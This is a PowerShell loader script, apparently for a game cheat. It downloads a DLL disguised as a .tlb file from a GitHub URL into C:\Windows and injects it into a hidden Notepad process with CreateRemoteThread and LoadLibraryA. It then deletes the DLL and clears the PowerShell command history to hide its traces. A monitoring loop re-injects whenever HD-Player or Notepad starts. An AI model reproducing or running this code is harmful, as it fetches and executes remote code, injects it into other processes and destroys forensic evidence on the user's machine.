# === Constants ===
$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04
$dllUrl = "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShellJector.tlb"
$dllPath = "C:\Windows\ShellJector.tlb"

$wasHdPlayerRunning = $false
$wasNotepadRunning = $false

# === Win32 API declarations ===
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
}
"@

function Inject-IntoNewNotepad {
    try {
        Write-Host "`n[*] Launching new hidden Notepad for injection..."
        $newProcess = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
        Start-Sleep -Milliseconds 500

        Write-Host "[*] Downloading DLL..."
        Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop

        $targetPid = $newProcess.Id
        $hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $targetPid)

        if ($hProcess -eq [IntPtr]::Zero) {
            Write-Host "[-] Failed to open process PID $targetPid"
            return
        }

        $dllBytes = [System.Text.Encoding]::ASCII.GetBytes($dllPath + [char]0)
        $allocMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllBytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)

        if ($allocMem -eq [IntPtr]::Zero) {
            Write-Host "[-] Memory allocation failed"
            return
        }

        $written = [IntPtr]::Zero
        $wrote = [Win32]::WriteProcessMemory($hProcess, $allocMem, $dllBytes, $dllBytes.Length, [ref]$written)

        if (-not $wrote) {
            Write-Host "[-] WriteProcessMemory failed"
            return
        }

        $hKernel32 = [Win32]::GetModuleHandle("kernel32.dll")
        $loadLibraryAddr = [Win32]::GetProcAddress($hKernel32, "LoadLibraryA")

        if ($loadLibraryAddr -eq [IntPtr]::Zero) {
            Write-Host "[-] Failed to get LoadLibraryA address"
            return
        }

        $threadId = [IntPtr]::Zero
        [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [ref]$threadId) | Out-Null
        Write-Host "[+] DLL injected successfully into Notepad PID $targetPid"

        # 🔥 Wait and silently delete DLL
        Start-Sleep -Seconds 2
        Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
        Write-Host "[*] DLL deleted from disk."

        # === Clear PowerShell history without deleting file ===
        $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        Set-Content -Path $historyPath -Value ""
        Write-Host "[*] Cleared ConsoleHost_history.txt"

    } catch {
        Write-Host "[-] Injection failed: $($_.Exception.Message)"
    }
}


# === Continuous Monitoring Loop ===
Write-Host "`n[*] Monitoring started... (Press Ctrl+C to stop)"
while ($true) {
    try {
        $isHdPlayerRunning = Get-Process -Name "HD-Player" -ErrorAction SilentlyContinue
        $isNotepadRunning = Get-Process -Name "notepad" -ErrorAction SilentlyContinue

        $hdJustStarted = ($isHdPlayerRunning -ne $null) -and (-not $wasHdPlayerRunning)
        $notepadJustStarted = ($isNotepadRunning -ne $null) -and (-not $wasNotepadRunning)

        if ($hdJustStarted) {
            Write-Host "[+] HD-Player started — injecting..."
            Inject-IntoNewNotepad
        }

        if ($notepadJustStarted) {
            Write-Host "[+] Notepad started — injecting..."
            Inject-IntoNewNotepad
        }

        $wasHdPlayerRunning = $isHdPlayerRunning -ne $null
        $wasNotepadRunning = $isNotepadRunning -ne $null

    } catch {
        Write-Host "[-] Error during monitoring: $($_.Exception.Message)"
    }

    Start-Sleep -Seconds 2
}
